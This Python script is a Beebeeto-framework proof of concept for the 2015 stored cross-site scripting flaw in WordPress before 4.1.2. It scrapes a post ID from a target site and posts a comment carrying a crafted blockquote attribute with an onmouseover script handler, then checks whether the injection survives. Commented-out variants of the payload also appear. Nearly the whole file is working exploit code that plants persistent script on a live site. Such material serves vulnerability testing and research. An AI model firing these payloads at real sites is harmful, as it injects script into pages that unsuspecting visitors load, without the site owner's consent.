#!/usr/bin/env python
# encoding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import random
import string
import requests
import pdb
import os
import codecs

import types

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0092',
            'name': 'Wordpress < 4.1.2 /wp-comments-post.php 存储型XSS漏洞 POC',
            'author': 'tmp',
            'create_date': '2015-04-26',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Wordpress',
            'vul_version': ['<4.1.2'],
            'type': 'Cross Site Scripting',
            'tag': ['Wordpress存储型XSS漏洞', '/wp-comments-post.php', 'Cross Site Scripting', 'php'],
            'desc': '''
                    该问题由 mysql 的一个特性引起，在 mysql 的 utf8 字符集中，一个字符由1~3个字节组成，
                    对于大于3个字节的字符，mysql 使用了 utf8mb4 的形式来存储。
                    如果我们将一个 utf8mb4 字符插入到 utf8 编码的列中，那么在mysql的非strict mode下，
                    他会将后面的内容截断，导致我们可以利用这一缺陷完成 XSS 攻击。
                    ''',
            'references': [
                    'https://wordpress.org/news/2015/04/wordpress-4-1-2/',
                    'https://cedricvb.be/post/wordpress-stored-xss-vulnerability-4-1-2/',
                           ],
        },
    }

    @classmethod
    def verify(cls, args):
        target = args['options']['target']
        verify_url = target + '/wp-comments-post.php'
        # get post_id
        try:
            post_id = re.search(r'post-(?P<post_id>[\d]+)', requests.get(target).content).group('post_id')
        except:
            if args['options']['verbose']:
                print 'Not wordpress'
            return
        print post_id
        rand_str = lambda length: ''.join([ random.choice(string.letters) for i in xrange(length) ])
        comment_text = rand_str(10)
        cite_text = rand_str(5)
        fill_text = rand_str(100)
        # comment = "%s<a href='%s onmouseover=alert(1) // %s'>" % (comment_text, cite_text, fill_text)
        # comment = "%s<a href='%s style=display:block;position:fixed;width:100%;height:100%;top:0; onmouseover=alert(1) // %s'>" % (comment_text, cite_text, fill_text)
        # comment = "<a href='" + cite_text + " style=display:block;position:fixed;width:100%;height:100%;top:0; onmouseover=alert(1) // " + fill_text + "'>"
        # comment = "<a href='" + cite_text + " onmouseover=alert(1) // " + fill_text + "'>"
        # print comment

        comment = "%s<blockquote cite='%s' onmouseover=alert(1) // %s'>" % (comment_text, cite_text, fill_text)
        fp = open('comment.txt', 'w')
        fp.write(comment)
        fp.close()
        print 'write down...'
        # print comment
        payload = {
                'author': rand_str(10),
                'email': '%s@%s.com' % (rand_str(9), rand_str(5)),
                'url':'http://%s.com' % rand_str(10),
                # 'comment': "%s<bloquote cite='%s onmouseover=alert(1) // %s'>" % (comment_text, cite_text, fill_text),
                'comment': comment,
                'comment_post_ID':post_id
                }
        content = requests.post(verify_url, data=payload).content
        fp = codecs.open('content.txt', 'w', 'utf-8')
        fp.write(content)
        fp.close()
        # if "%s<a href=&#8270;%s onmouseover=alert(1)" % cite_text in content:
        if "<blockquote cite=&#8217;%s onmouseover=alert(1)" % cite_text in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args
    exploit = verify

if __name__ == "__main__":
    os.system('clear')
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
